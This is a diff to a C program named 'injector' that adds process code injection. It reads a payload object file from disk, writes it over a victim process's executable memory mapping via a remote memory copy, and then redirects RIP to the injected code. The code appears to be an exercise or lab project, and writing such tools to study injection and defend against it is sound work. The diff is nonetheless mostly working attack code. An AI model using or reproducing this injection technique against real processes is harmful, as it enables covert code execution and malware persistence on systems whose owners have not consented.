@@ -76,6 +76,8 @@ int main(int argc, char* argv[])
 	pmStruct_ptr procMaps_ptr = NULL;  // /proc/PID/maps for argv[1]
 	pmStruct_ptr tmpPM_ptr = NULL;  // Temporary variable to print out certain mappings
 	struct iovec* localBackup = NULL;  // Local backup of the PIDs executable memory map
+	char* payloadFilename = NULL;  // Store the payload absolute or relative filename here
+	char* payloadContents = NULL;  // Store the contents of the payload here
 
 	// INPUT VALIDATION
 	// procPIDStructs
@@ -196,7 +198,9 @@ int main(int argc, char* argv[])
 	// 4. Backup the memory section
 	if (true == success)
 	{
-		localBackup = copy_remote_to_local(vicPID->pidNum, tmpPM_ptr->addr_start, (size_t)tmpPM_ptr->length);
+		localBackup = copy_remote_to_local(vicPID->pidNum, \
+										   tmpPM_ptr->addr_start, \
+										   (size_t)tmpPM_ptr->length);
 
 		if (!localBackup)
 		{
@@ -226,7 +230,37 @@ int main(int argc, char* argv[])
 	// 5. Overwrite executable memory section
 	if (true == success)
 	{
-
+		// 6.1. Determine payload locaiton
+		payloadFilename = os_path_join("3-22-1_Payloads", "payload_64_write_1.o", true);
+		
+		if (!payloadFilename)
+		{
+			HARKLE_ERROR(injector, main, os_path_join failed);
+			success = false;
+		}
+		else
+		{
+			// 6.2. Read the payload in
+			payloadContents = fread_a_file(payloadFilename);
+			
+			if (!payloadContents)
+			{
+				HARKLE_ERROR(injector, main, fread_a_file failed);
+				success = false;
+			}
+			else
+			{
+				// 6.3. Write the payload to memory
+				if (copy_local_to_remote(vicPID->pidNum, \
+										 tmpPM_ptr->addr_start, \
+										 payloadContents, \
+										 strlen(payloadContents)))
+				{
+					HARKLE_ERROR(injector, main, copy_local_to_remote failed);
+					success = false;
+				}
+			}
+		}
 	}
 
 	// 6. Update RIP to point to the injected code
@@ -286,6 +320,15 @@ int main(int argc, char* argv[])
 		if (false == free_iovec_struct(&localBackup, true))
 		{
 			HARKLE_ERROR(injector, main, free_iovec_struct failed);
+		}
+	}
+	
+	// 5. payloadFilename
+	if (payloadFilename)
+	{
+		if (false == release_a_string(&payloadFilename))
+		{
+			HARKLE_ERROR(injector, main, release_a_string failed);
 		}
 	}
 
